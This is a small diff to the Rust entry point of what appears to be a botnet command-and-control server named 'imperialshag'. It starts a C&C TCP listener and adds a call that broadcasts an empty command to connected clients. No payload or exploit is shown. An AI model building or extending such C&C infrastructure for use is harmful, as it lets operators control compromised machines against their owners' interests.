@@ -8,9 +8,12 @@ const PORT: u16 = 8080;
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("Welcome to imperialshag :)");
     println!("Starting TCP server.");
+    let mut server = server::Server::new();
 
-    server::start_cnc_server(IP, PORT).await?;
+    server::start_cnc_server(IP, PORT, &mut server).await?;
 
+    println!("I'm here");
+    server.broadcast_command(b"".to_vec()).await;
     Ok(())
 }
 
